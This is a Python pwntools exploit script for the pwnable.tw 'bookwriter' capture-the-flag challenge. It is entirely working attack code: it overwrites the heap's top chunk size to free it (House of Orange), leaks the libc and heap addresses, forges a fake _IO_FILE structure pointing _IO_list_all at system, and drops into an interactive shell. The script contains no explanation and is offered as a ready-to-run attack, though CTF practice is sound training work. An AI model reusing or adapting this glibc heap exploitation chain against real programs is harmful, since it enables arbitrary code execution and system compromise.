from pwn import *
from hog import *

context.log_level="debug"

def add(size,content):
	p.sendlineafter('Your choice :', '1')
	p.sendlineafter('Size of page :', str(size))
	p.sendafter('Content :', str(content))

def view(index):
	p.recv()
	p.sendline('2')
#	p.sendlineafter('Your choice :', '2')
	p.sendlineafter('Index of page :', str(index))

def edit(index,content):
	p.sendlineafter('Your choice :', '3')
	p.sendlineafter('Index of page :', str(index))
#	p.sendafter('Content :', str(content))
	p.recv()
	p.send(str(content))

def infor(author):
	p.sendlineafter('Your choice :', '4')
	p.sendlineafter('Do you want to change the author ? (yes:1 / no:0) ', '1')
	p.sendafter('Author :', str(author))

p = process('./bookwriter')
#p = remote('chall.pwnable.tw', 10304)
e = ELF('./bookwriter')
#l = ELF('./libc_64.so.6')
l = e.libc
pause()

p.sendlineafter('Author :', 'a'* 0x40)
### free top chunk
add(24,'0')
edit(0, 'a' * 24)
edit(0, 'a' * 24 +p64(0xfe1))
add(5000,'0')
###############
### libc leak
add(16,'a')
edit(2,'a' * 8)
view(2)

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 1640 - 16 - l.sym['__malloc_hook']
log.info('libc : ' + hex(libc))
log.info('sys : ' + hex(libc + l.sym['system']))
##############
### heap leak
p.sendlineafter('Your choice :', '4')
p.recvuntil('a' * 0x40)
f_chunk = u64(p.recv(4).ljust(8,'\x00'))
log.info('first chunk ptr : ' + hex(f_chunk))
p.sendlineafter('Do you want to change the author ? (yes:1 / no:0) ', '0')
#############
###size[0] = heap_addr
edit(0,'\x00')
for i in range(6):
	add(16,'0')

#############
fake_struct_start = f_chunk + 0xf0
log.info('fake _IO_FILE start : '+ hex(fake_struct_start))

payload = '\x00' * 0xf0
payload += hog_wide_data(libc + l.sym['_IO_list_all'],fake_struct_start,libc + l.sym['system'])
edit(0,payload)

p.sendlineafter('Your choice :', '1')
pause()
p.sendlineafter('Size of page :', '5')

p.interactive()
